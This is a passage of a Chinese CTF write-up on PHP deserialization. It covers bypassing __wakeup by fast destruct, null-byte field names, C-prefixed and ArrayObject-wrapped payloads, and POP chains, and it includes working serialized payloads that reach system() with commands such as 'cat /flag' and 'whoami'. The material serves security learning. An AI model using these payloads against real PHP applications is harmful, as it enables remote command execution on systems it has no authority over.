class="hljs-number">4</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;N;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;N;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;key&quot;</span>;O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;fine&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;cmd&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;system&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;content&quot;</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;cat /flag&quot;</span>;&#125;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;hint&quot;</span>;r:<span class="hljs-number">10</span>;&#125;&#125;</code></pre></div><h3 id="相似题目的特殊情况"><a href="#相似题目的特殊情况" class="headerlink" title="相似题目的特殊情况"></a>相似题目的特殊情况</h3><p>上面的题目因为开头是sorry类，所以正好能调用setPassword</p><div class="code-wrapper"><pre><code class="hljs">$a = unserialize($_GET[&#39;pop&#39;]);$a-&gt;setPassword(md5(mt_rand()));</code></pre></div><p>但若调用了个不存在的方法呢</p><div class="code-wrapper"><pre><code class="hljs gams">#这里<span class="hljs-symbol">$</span>FV的类没有loadfile()方法<span class="hljs-meta"><span class="hljs-keyword">$FV</span> = unserialize(base64_decode($path_info));</span><span class="hljs-meta"><span class="hljs-keyword">$FV</span>-&gt;loadfile();</span></code></pre></div><p>题目</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileViewer</span></span>&#123;        <span class="hljs-keyword">public</span> <span class="hljs-variable">$black_list</span> = <span class="hljs-string">&quot;flag&quot;</span>;        <span class="hljs-keyword">public</span> <span class="hljs-variable">$local</span> = <span class="hljs-string">&quot;http://127.0.0.1/&quot;</span>;        <span class="hljs-keyword">public</span> <span class="hljs-variable">$path</span>;        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$f</span>,<span class="hljs-variable">$a</span></span>)</span>&#123;            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">loadfile</span>();        &#125;        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">loadfile</span>(<span class="hljs-params"></span>)</span>&#123;            <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$this</span>-&gt;path))&#123;                <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-variable">$this</span>-&gt;black_list.<span class="hljs-string">&quot;/i&quot;</span>,<span class="hljs-variable">$this</span>-&gt;path))&#123;                    <span class="hljs-variable">$file</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">curl</span>(<span class="hljs-variable">$this</span>-&gt;local.<span class="hljs-string">&quot;cheems.jpg&quot;</span>);                &#125;<span class="hljs-keyword">else</span>&#123;                    <span class="hljs-variable">$file</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">curl</span>(<span class="hljs-variable">$this</span>-&gt;local.<span class="hljs-variable">$this</span>-&gt;path);                &#125;            &#125;<span class="hljs-keyword">else</span>&#123;                <span class="hljs-variable">$file</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">curl</span>(<span class="hljs-variable">$this</span>-&gt;local.<span class="hljs-string">&quot;cheems.jpg&quot;</span>);            &#125;            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;img src=&quot;data:jpg;base64,&#x27;</span>.<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$file</span>).<span class="hljs-string">&#x27;&quot;/&gt;&#x27;</span>;        &#125;        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">curl</span>(<span class="hljs-params"><span class="hljs-variable">$path</span></span>)</span>&#123;            <span class="hljs-variable">$url</span> = <span class="hljs-variable">$path</span>;            <span class="hljs-variable">$curl</span> = <span class="hljs-title function_ invoke__">curl_init</span>();            <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curl</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);            <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curl</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);            <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curl</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);            <span class="hljs-variable">$response</span> = <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$curl</span>);            <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$curl</span>);            <span class="hljs-keyword">return</span> <span class="hljs-variable">$response</span>;        &#125;        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;            <span class="hljs-variable language_">$this</span>-&gt;local = <span class="hljs-string">&quot;http://127.0.0.1/&quot;</span>;        &#125;    &#125;    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Backdoor</span></span>&#123;        <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;        <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;        <span class="hljs-keyword">public</span> <span class="hljs-variable">$superhacker</span> = <span class="hljs-string">&quot;hacker.jpg&quot;</span>;        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">goodman</span>(<span class="hljs-params"><span class="hljs-variable">$i</span>,<span class="hljs-variable">$j</span></span>)</span>&#123;            <span class="hljs-variable">$i</span>-&gt;<span class="hljs-variable">$j</span> = <span class="hljs-variable language_">$this</span>-&gt;superhacker;        &#125;        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">goodman</span>(<span class="hljs-variable">$this</span>-&gt;a,<span class="hljs-variable">$this</span>-&gt;b);            <span class="hljs-variable language_">$this</span>-&gt;a-&gt;<span class="hljs-title function_ invoke__">c</span>();        &#125;    &#125;<span class="hljs-variable">$path_info</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;path_info&#x27;</span>];<span class="hljs-variable">$FV</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$path_info</span>));<span class="hljs-variable">$FV</span>-&gt;<span class="hljs-title function_ invoke__">loadfile</span>();</code></pre></div><div class="code-wrapper"><pre><code class="hljs cpp"><span class="hljs-meta">#pop链</span>Backdoor::destruct–&gt;FileViewer::__call–&gt;FileViewer::loadfile</code></pre></div><p>可以看到反序列化后的开头类是<code>Backdoor</code> （不太会表述，自行理解一下）</p><p><code>Backdoor</code>没有<code>loadfile()</code>方法</p><p><img src="/2023/08/31/php%E7%9A%84-wakeup%E7%BB%95%E8%BF%87/image-20230904113401962.png" alt="image-20230904113401962"></p><h4 id="预期解fast-destruct"><a href="#预期解fast-destruct" class="headerlink" title="预期解fast destruct"></a>预期解fast destruct</h4><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileViewer</span></span>&#123;        <span class="hljs-keyword">public</span> <span class="hljs-variable">$black_list</span> = <span class="hljs-string">&quot;flag&quot;</span>;        <span class="hljs-keyword">public</span> <span class="hljs-variable">$local</span> = <span class="hljs-string">&quot;http://127.0.0.1/&quot;</span>;        <span class="hljs-keyword">public</span> <span class="hljs-variable">$path</span>;    &#125;    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Backdoor</span></span>&#123;        <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;        <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;        <span class="hljs-keyword">public</span> <span class="hljs-variable">$superhacker</span> = <span class="hljs-string">&quot;http://127.0.0.1:65500&quot;</span>;        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;            <span class="hljs-variable language_">$this</span>-&gt;a = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileViewer</span>;            <span class="hljs-variable language_">$this</span>-&gt;b=<span class="hljs-string">&quot;local&quot;</span>;         &#125;     &#125;    <span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Backdoor</span>();    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<span class="hljs-meta">?&gt;</span></code></pre></div><p>结果随便改点触发fast destruct即可</p><h4 id="特殊解法"><a href="#特殊解法" class="headerlink" title="特殊解法"></a>特殊解法</h4><p>再实例化一个 <code>FileViewer</code> 对象 将 <code>Backdoor</code> 塞进这个对象的某个属性里（不存在的属性）</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Backdoor</span>();<span class="hljs-variable">$b</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileViewer</span>();<span class="hljs-variable">$b</span>-&gt;test = <span class="hljs-variable">$a</span>;        <span class="hljs-comment">###FileViewer中没有test属性</span><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$b</span>));</code></pre></div><p> 先总结一下这道题的做法</p><p>这道题目主要是在<code>loadfile()</code>报错终止程序之前触发<code>__destruct</code>方法（就是预期解）</p><p><img src="/2023/08/31/php%E7%9A%84-wakeup%E7%BB%95%E8%BF%87/image-20230904132128523.png" alt="image-20230904132128523"></p><p>可以看到<code>__destruct</code> 比<code>__wakeup</code>还要提前执行（所以可以<code>__wakeup</code>绕过，但这里就不是绕过<code>__wakeup</code>的问题）</p><p>特殊解决方法</p><p><code>loadfile()</code>不会报错，并且由于这里有可以赋值的函数，所以<code>__wakeup</code>的限定已经是废了</p><div class="code-wrapper"><pre><code class="hljs">public function goodman($i,$j)&#123;    $i-&gt;$j = $this-&gt;superhacker;&#125;</code></pre></div><p><img src="/2023/08/31/php%E7%9A%84-wakeup%E7%BB%95%E8%BF%87/image-20230904131915690.png" alt="image-20230904131915690"></p><h4 id="对这道题的个人一些小问题，挺不理解的还是魔法函数的调用顺序问题"><a href="#对这道题的个人一些小问题，挺不理解的还是魔法函数的调用顺序问题" class="headerlink" title="对这道题的个人一些小问题，挺不理解的还是魔法函数的调用顺序问题"></a>对这道题的个人一些小问题，挺不理解的还是魔法函数的调用顺序问题</h4><p>但这里的调用顺序不是很明白</p><p><img src="/2023/08/31/php%E7%9A%84-wakeup%E7%BB%95%E8%BF%87/image-20230904131915690.png" alt="image-20230904131915690"></p><p>问了<code>unknown</code>师傅，原来<code>new</code> 了几次<code>Fileviewer</code>就会触发几个<code>__wakeup</code>,然后都在<code>unserialzie</code>之前调用，接着由于是<code>FileViewer</code>类可以调用<code>loadfile()</code>，调用完后程序结束触发<code>__destruct</code></p><h5 id="由此扩展一下"><a href="#由此扩展一下" class="headerlink" title="由此扩展一下"></a>由此扩展一下</h5><p>假设Backdoor中也有<code>__wakeup</code>方法，那会是咋样的呢 </p><p>预期解（fast destruct之后）</p><p><img src="/2023/08/31/php%E7%9A%84-wakeup%E7%BB%95%E8%BF%87/image-20230904190051280.png" alt="image-20230904190051280"></p><p>对比之前预期解的结果，可以看到先触发了Fileviewer的<code>__wakeup</code>，再触发了Backdoor的<code>__wakeup</code>，然后执行<code>__destruct</code></p><p>可以绕过报错，但无法绕过<code>__wakeup</code>，。。。。。。。（哎）</p><p>特殊解决方法 的情况</p><p><img src="/2023/08/31/php%E7%9A%84-wakeup%E7%BB%95%E8%BF%87/image-20230904194132585.png" alt="image-20230904194132585"></p><p>这backdoor中的__wakeup触发顺序不是很懂</p><p>当我在特殊情况上多套一层</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Backdoor</span>();<span class="hljs-variable">$a</span>-&gt;a = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileViewer</span>();<span class="hljs-variable">$a</span>-&gt;b= <span class="hljs-string">&quot;local&quot;</span>;<span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileViewer</span>();<span class="hljs-variable">$b</span>-&gt;test = <span class="hljs-variable">$a</span>;<span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileViewer</span>();<span class="hljs-variable">$c</span>-&gt;test = <span class="hljs-variable">$b</span>;<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$c</span>);</code></pre></div><p><img src="/2023/08/31/php%E7%9A%84-wakeup%E7%BB%95%E8%BF%87/image-20230904201512660.png" alt="image-20230904201512660"></p><p>是在输出<code>back_wakeup</code>之后多输出了一次<code>__wakup</code></p><p>那我在特殊情况的<code>backdoor</code>里面多套一层<code>new FileViewer</code>呢</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileViewer</span>();<span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Backdoor</span>();<span class="hljs-variable">$a</span>-&gt;a = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileViewer</span>();<span class="hljs-variable">$a</span>-&gt;b= <span class="hljs-string">&quot;local&quot;</span>;<span class="hljs-variable">$a</span>-&gt;c = <span class="hljs-variable">$c</span>;<span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileViewer</span>();<span class="hljs-variable">$b</span>-&gt;test = <span class="hljs-variable">$a</span>;<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$b</span>);</code></pre></div><p><img src="/2023/08/31/php%E7%9A%84-wakeup%E7%BB%95%E8%BF%87/image-20230904201833235.png" alt="image-20230904201833235"></p><p>由此得出__wakeup函数的触发顺序</p><h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><ul><li><code>new</code> 了几次<code>Fileviewer</code>就会触发几个<code>__wakeup</code></li><li>当本类同时有<code>__destruct</code>和<code>__wakeup</code>，fast destruct绕不过去</li><li>有多个<code>__wakeup</code>函数时，触发的顺序是根据payload中的类<strong>由里到外</strong>的顺序</li></ul><h2 id="php-issue-9618-（wakeup与destruct在不同类）"><a href="#php-issue-9618-（wakeup与destruct在不同类）" class="headerlink" title="php issue#9618 （wakeup与destruct在不同类）"></a>php issue#9618 （wakeup与destruct在不同类）</h2><p>原理：</p><p>序列化时<code>protected</code>字段名前面会加上<code>\0*\0</code>的前缀    <code>s:6:&quot;\0*\0end&quot;</code></p><p>序列化时<code>private</code>字段名前面会加上<code>\0类名\0</code>的前缀    <code>s:6:&quot;\0A\0end&quot;</code></p><div class="code-wrapper"><pre><code class="hljs kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>&#123;    <span class="hljs-keyword">private</span> $end = <span class="hljs-string">&quot;1&quot;</span>;       #<span class="hljs-keyword">private</span>或<span class="hljs-keyword">protected</span>的变量&#125;</code></pre></div><p>由于\0不可见（一般改为%00），上传时会出现数字与字符数量不匹配的情况</p><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-comment">#序列化的真实情况</span><span class="hljs-attribute">O</span>:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;A&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;info&quot;</span>;O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;B&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;znd&quot;</span>;N;&#125;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;\0A\0end&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;1&quot;</span>;&#125;<span class="hljs-comment">#上传payload</span><span class="hljs-attribute">O</span>:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;A&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;info&quot;</span>;O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;B&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;znd&quot;</span>;N;&#125;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;Aend&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;1&quot;</span>;&#125;</code></pre></div><p>大概跟字符串报错一个原理</p><p>当在同一个类中时，想要以这样的方式绕过__wakeup是行不通的（而且是无法解析）</p><p><img src="/2023/08/31/php%E7%9A%84-wakeup%E7%BB%95%E8%BF%87/image-20230903225210268.png" alt="image-20230903225210268"></p><p>当加入%00时才能输出（但不能绕过）</p><p><img src="/2023/08/31/php%E7%9A%84-wakeup%E7%BB%95%E8%BF%87/image-20230903225414998.png" alt="image-20230903225414998"></p><h2 id="使用C绕过"><a href="#使用C绕过" class="headerlink" title="使用C绕过"></a>使用C绕过</h2><p>因为<code>C</code>中不存在<code>__wakeup</code>方法，所以就直接跳过去了</p><p><code>C</code>只能执行<code>construct()</code>函数或者<code>destruct()</code>函数，并且无法添加任何内容</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfshow</span></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;not allowed!&quot;</span>);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;OK&quot;</span>;        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$this</span>-&gt;ctfshow);    &#125;&#125; <span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ctfshow</span>();<span class="hljs-variable">$a</span>-&gt;ctfshow = <span class="hljs-string">&quot;whoami&quot;</span>;<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<span class="hljs-comment">##O:7:&quot;ctfshow&quot;:1:&#123;s:7:&quot;ctfshow&quot;;s:6:&quot;whoami&quot;;&#125;</span></code></pre></div><p>直接改为<code>C:7:&quot;ctfshow&quot;:1:&#123;s:7:&quot;ctfshow&quot;;s:6:&quot;whoami&quot;;&#125;</code> ，无结果回显</p><p>使用<code>C:7:&quot;ctfshow&quot;:0:&#123;&#125;</code>，能够成功绕过<code>__wakeup</code>执行<code>__destruct</code>的代码（但由于不能带参数，无法执行<code>system</code>函数）</p><p><img src="/2023/08/31/php%E7%9A%84-wakeup%E7%BB%95%E8%BF%87/image-20230903232632446.png" alt="image-20230903232632446"></p><h3 id="真正做法"><a href="#真正做法" class="headerlink" title="真正做法"></a>真正做法</h3><p>使用<code>ArrayObject</code>对正常的反序列化进行一次包装，让最后输出的payload以<code>C</code>开头</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfshow</span> </span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ctfshow</span>;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;not allowed!&quot;</span>);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;OK&quot;</span>;        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$this</span>-&gt;ctfshow);    &#125;&#125;<span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> ctfshow;<span class="hljs-variable">$a</span>-&gt;ctfshow=<span class="hljs-string">&quot;whoami&quot;</span>;<span class="hljs-variable">$arr</span>=<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;evil&quot;</span>=&gt;<span class="hljs-variable">$a</span>);<span class="hljs-variable">$oa</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayObject</span>(<span class="hljs-variable">$arr</span>);<span class="hljs-variable">$res</span>=<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$oa</span>);<span class="hljs-keyword">echo</span> <span class="hljs-variable">$res</span>;<span class="hljs-meta">?&gt;</span><span class="hljs-comment">#C:11:&quot;ArrayObject&quot;:77:&#123;x:i:0;a:1:&#123;s:4:&quot;evil&quot;;O:7:&quot;ctfshow&quot;:1:&#123;s:7:&quot;ctfshow&quot;;s:6:&quot;whoami&quot;;&#125;&#125;;m:a:0:&#123;&#125;&#125;</span></code></pre></div><p>并且不能像平常一样修改命令和对应数量</p><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">C</span>:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;ArrayObject&quot;</span>:<span class="hljs-number">77</span>:&#123;x:i:<span class="hljs-number">0</span>;a:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;evil&quot;</span>;O:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;ctfshow&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;ctfshow&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;ls /&quot;</span>;&#125;&#125;;m:a:<span class="hljs-number">0</span>:&#123;&#125;&#125;     #修改命令和对应数量</code></pre></div><p><img src="/2023/08/31/php%E7%9A%84-wakeup%E7%BB%95%E8%BF%87/image-20230903233724352.png" alt="image-20230903233724352"></p><p>无结果</p><p>其他像<code>ArrayObject</code>的生成以<code>c</code>开头的<code>payload</code>，请看愚人杯3rd[easy_php] | Boogiepop Doesn’t Laugh (boogipop.com)](<a href="https://boogipop.com/2023/04/02/%E6%84%9A%E4%BA%BA%E6%9D%AF3rd">https://boogipop.com/2023/04/02/愚人杯3rd</a> [easy_php]&#x2F;)</p><p>嘿嘿，还得是Boogipop大佬</p><h1 id="php冷知识"><a href="#php冷知识" class="headerlink" title="php冷知识"></a>php冷知识</h1><h2 id="题目：serialize-unserialize-x-x"><a href="#题目：serialize-unserialize-x-x" class="headerlink" title="题目：serialize(unserialize($x)) !&#x3D; $x"></a>题目：serialize(unserialize($x)) !&#x3D; $x</h2><p>正常来说一个合法的反序列化字符串，在二次序列化也即反序列化再序列化之后所得到的结果是一致的。</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$raw</span> = <span class="hljs-string">&#x27;O:1:&quot;A&quot;:1:&#123;s:1:&quot;a&quot;;s:1:&quot;b&quot;;&#125;&#x27;</span>;<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$raw</span>));<span class="hljs-comment">#O:1:&quot;A&quot;:1:&#123;s:1:&quot;a&quot;;s:1:&quot;b&quot;;&#125;</span></code></pre></div><p>当我们反序列化一个不存在的类时，会发生什么</p><p><img src="/2023/08/31/php%E7%9A%84-wakeup%E7%BB%95%E8%BF%87/image-20230904104019989.png" alt="image-20230904104019989"></p><p>可以看到出现了<code>__PHP_Incomplete_Class</code></p><p>PHP在遇到不存在的类时，会把不存在的类转换成<code>__PHP_Incomplete_Class</code>这种特殊的类，同时将原始的类名<code>A</code>存放在<code>__PHP_Incomplete_Class_Name</code>这个属性中，其余属性存放方式不变。而我们在序列化这个对象的时候，<code>serialize</code>遇到<code>__PHP_Incomplete_Class</code>这个特殊类会倒推回来，序列化成<code>__PHP_Incomplete_Class_Name</code>值为类名的类（即<code>A</code>）</p><p>当我们自己构造如下字符串</p><div class="code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">a</span>:<span class="hljs-number">2</span>:&#123;<span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>;O:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;stdClass&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;abc&quot;</span>;N;&#125;<span class="hljs-selector-tag">i</span>:<span class="hljs-number">1</span>;O:<span class="hljs-number">22</span>:<span class="hljs-string">&quot;__PHP_Incomplete_Class&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;abd&quot;</span>;N;&#125;&#125;</code></pre></div><p><img src="/2023/08/31/php%E7%9A%84-wakeup%E7%BB%95%E8%BF%87/image-20230904110708015.png" alt="image-20230904110708015"></p><p>可以看到当反序列化后的结果再次序列化后<code>O:22:&quot;__PHP_Incomplete_Class&quot;:1:&#123;s:1:&quot;a&quot;;O:7:&quot;classes&quot;:0:&#123;&#125;&#125;</code>中<code>__PHP_Incomplete_Class_Name</code>为空，找不到应该绑定的类，其属性就被丢弃了，导致了<code>serialize(unserialize($x)) != $x</code>的出现。</p><h3 id="强网杯2021-WhereisUWebShell"><a href="#强网杯2021-WhereisUWebShell" class="headerlink" title="强网杯2021 WhereisUWebShell"></a>强网杯2021 WhereisUWebShell</h3><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-comment">// index.php</span><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;display_errors&#x27;</span>, <span class="hljs-string">&#x27;on&#x27;</span>);<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;function.php&quot;</span>;<span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;ctfer&#x27;</span>]);<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/myclass/i&#x27;</span>,<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$res</span>)))&#123;    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;Error: Class &#x27;myclass&#x27; not found &quot;</span>);&#125;<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&quot;myclass.php&quot;</span>);<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&quot;function.php&quot;</span>);</code></pre></div><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-comment">// myclass.php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Hello</span></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;           <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;qwb) <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;qwb);    &#125;&#125;<span class="hljs-meta">?&gt;</span></code></pre></div><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-comment">// function.php</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__autoload</span>(<span class="hljs-params"><span class="hljs-variable">$classname</span></span>)</span>&#123;    <span class="hljs-keyword">require_once</span> <span class="hljs-string">&quot;./<span class="hljs-subst">$classname</span>.php&quot;</span>;&#125;<span class="hljs-meta">?&gt;</span></code></pre></div><p>需要加载<code>myclass.php</code>中的<code>hello</code>类，但是要引入<code>hello</code>类，根据<code>__autoload</code>我们需要一个<code>classname</code>为<code>myclass</code>的类</p><p>但问题就是<code>myclass</code>类不存在，如果直接去反序列化，只会在反序列化<code>myclass</code>类的时候报错无法进入下一步，或者在反序列化<code>Hello</code>的时候找不到这个类而报错。</p><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">a</span>:<span class="hljs-number">2</span>:&#123;i:<span class="hljs-number">0</span>;O:<span class="hljs-number">22</span>:<span class="hljs-string">&quot;__PHP_Incomplete_Class&quot;</span>:<span 